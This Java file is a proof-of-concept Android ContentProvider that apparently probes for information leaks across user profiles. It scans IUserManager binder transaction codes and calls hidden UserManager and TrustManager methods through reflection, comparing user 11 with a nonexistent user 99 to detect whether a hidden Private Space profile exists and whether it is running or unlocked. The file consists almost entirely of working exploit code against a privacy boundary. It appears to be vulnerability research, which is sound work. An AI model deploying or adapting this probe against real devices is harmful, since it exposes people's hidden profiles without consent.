package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import android.os.UserHandle;
import java.lang.reflect.Method;

/**
 * Extended PoC: Scan for more UserManager and other services that leak
 * Private Space info via same-profile-group bypass
 */
public class AMDeepProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        IBinder umBinder = getServiceBinder("user");
        if (umBinder == null) { cursor.addRow(new Object[]{"error", "no UM binder"}); return cursor; }
        String umDesc = "android.os.IUserManager";

        // Scan ALL UserManager TX codes 1-60 for user 11 vs user 99
        // If user 11 returns data and user 99 doesn't, it's an oracle
        cursor.addRow(new Object[]{"=== UM full scan: u11 vs u99 ===", ""});
        for (int tx = 1; tx <= 60; tx++) {
            String result11 = probeUM(umBinder, umDesc, tx, 11);
            String result99 = probeUM(umBinder, umDesc, tx, 99);
            // Only show if behaviors differ (oracle)
            if (!result11.equals(result99)) {
                cursor.addRow(new Object[]{"um" + tx, "u11=" + result11 + " | u99=" + result99});
            }
        }

        // Also try UserManager API methods via reflection
        cursor.addRow(new Object[]{"=== UM API reflection ===", ""});
        try {
            Object um = getContext().getSystemService("user");
            Parcel uhParcel = Parcel.obtain();
            uhParcel.writeInt(11);
            uhParcel.setDataPosition(0);
            UserHandle uh11 = UserHandle.CREATOR.createFromParcel(uhParcel);
            uhParcel.recycle();

            // isProfile()
            try {
                Method isProfile = um.getClass().getMethod("isProfile");
                cursor.addRow(new Object[]{"isProfile()", String.valueOf(isProfile.invoke(um))});
            } catch (Exception e) {}

            // isUserOfType(UserHandle, String)
            try {
                Method m = um.getClass().getMethod("isUserOfType", UserHandle.class, String.class);
                Object r = m.invoke(um, uh11, "android.os.usertype.profile.private");
                cursor.addRow(new Object[]{"isUserOfType(11,private)", String.valueOf(r)});
            } catch (Exception e) {
                Throwable c = e.getCause() != null ? e.getCause() : e;
                cursor.addRow(new Object[]{"isUserOfType(11,private)", c.getClass().getSimpleName() + ":" + truncate(c.getMessage())});
            }

            // getProfileType(UserHandle)
            try {
                Method m = um.getClass().getMethod("getProfileType");
                Object r = m.invoke(um);
                cursor.addRow(new Object[]{"getProfileType(self)", String.valueOf(r)});
            } catch (Exception e) {}

            // getUserCreationTime(UserHandle)
            try {
                Method m = um.getClass().getMethod("getUserCreationTime", UserHandle.class);
                Object r = m.invoke(um, uh11);
                cursor.addRow(new Object[]{"getCreationTime(11)", String.valueOf(r)});
            } catch (Exception e) {
                Throwable c = e.getCause() != null ? e.getCause() : e;
                cursor.addRow(new Object[]{"getCreationTime(11)", c.getClass().getSimpleName() + ":" + truncate(c.getMessage())});
            }

            // getUserName
            try {
                Method m = um.getClass().getMethod("getUserName");
                Object r = m.invoke(um);
                cursor.addRow(new Object[]{"getUserName(self)", String.valueOf(r)});
            } catch (Exception e) {}

            // isQuietModeEnabled(UserHandle)
            try {
                Method m = um.getClass().getMethod("isQuietModeEnabled", UserHandle.class);
                Object r = m.invoke(um, uh11);
                cursor.addRow(new Object[]{"isQuietMode(11)", String.valueOf(r)});
            } catch (Exception e) {
                Throwable c = e.getCause() != null ? e.getCause() : e;
                cursor.addRow(new Object[]{"isQuietMode(11)", c.getClass().getSimpleName() + ":" + truncate(c.getMessage())});
            }

            // isUserRunning(UserHandle)
            try {
                Method m = um.getClass().getMethod("isUserRunning", UserHandle.class);
                Object r = m.invoke(um, uh11);
                cursor.addRow(new Object[]{"isUserRunning(11)", String.valueOf(r)});
            } catch (Exception e) {
                Throwable c = e.getCause() != null ? e.getCause() : e;
                cursor.addRow(new Object[]{"isUserRunning(11)", c.getClass().getSimpleName() + ":" + truncate(c.getMessage())});
            }

            // isUserUnlocked(UserHandle)
            try {
                Method m = um.getClass().getMethod("isUserUnlocked", UserHandle.class);
                Object r = m.invoke(um, uh11);
                cursor.addRow(new Object[]{"isUserUnlocked(11)", String.valueOf(r)});
            } catch (Exception e) {
                Throwable c = e.getCause() != null ? e.getCause() : e;
                cursor.addRow(new Object[]{"isUserUnlocked(11)", c.getClass().getSimpleName() + ":" + truncate(c.getMessage())});
            }

            // getEnabledProfiles — does this include Private Space?
            try {
                Method m = um.getClass().getMethod("getEnabledProfiles");
                Object r = m.invoke(um);
                cursor.addRow(new Object[]{"getEnabledProfiles()", String.valueOf(r)});
            } catch (Exception e) {
                Throwable c = e.getCause() != null ? e.getCause() : e;
                cursor.addRow(new Object[]{"getEnabledProfiles()", c.getClass().getSimpleName() + ":" + truncate(c.getMessage())});
            }

            // getUserProfiles — includes Private Space?
            try {
                Method m = um.getClass().getMethod("getUserProfiles");
                Object r = m.invoke(um);
                cursor.addRow(new Object[]{"getUserProfiles()", String.valueOf(r)});
            } catch (Exception e) {}

            // getAllProfiles — might include Private Space
            try {
                Method m = um.getClass().getMethod("getAllProfiles");
                Object r = m.invoke(um);
                cursor.addRow(new Object[]{"getAllProfiles()", String.valueOf(r)});
            } catch (Exception e) {}

        } catch (Exception e) {
            cursor.addRow(new Object[]{"api_err", truncate(e.getMessage())});
        }

        // Check TrustManager isActiveUnlockRunning more carefully
        // It returned 0 for all users — but what if we can tell valid from invalid?
        cursor.addRow(new Object[]{"=== TrustManager isActiveUnlockRunning ===", ""});
        IBinder trustBinder = getServiceBinder("trust");
        if (trustBinder != null) {
            String trustDesc = "android.app.trust.ITrustManager";
            for (int userId : new int[]{0, 11, 99, 200}) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(trustDesc);
                    data.writeInt(userId);
                    trustBinder.transact(15, data, reply, 0);
                    int exCode = reply.readInt();
                    if (exCode == 0) {
                        int val = reply.readInt();
                        cursor.addRow(new Object[]{"activeUnlock_u" + userId, "OK val=" + val});
                    } else {
                        cursor.addRow(new Object[]{"activeUnlock_u" + userId, "EX code=" + exCode});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"activeUnlock_u" + userId, "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }

        return cursor;
    }

    private String probeUM(IBinder binder, String desc, int tx, int userId) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        String result;
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(userId);
            binder.transact(tx, data, reply, 0);
            int exCode = reply.readInt();
            if (exCode == 0) {
                int avail = reply.dataAvail();
                if (avail >= 4) {
                    int v = reply.readInt();
                    result = "OK:" + avail + ":" + v;
                } else {
                    result = "OK:" + avail;
                }
            } else {
                result = "EX:" + exCode;
            }
        } catch (SecurityException e) {
            result = "SEC";
        } catch (Exception e) {
            result = "ERR";
        }
        data.recycle();
        reply.recycle();
        return result;
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 100 ? s.substring(0, 100) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
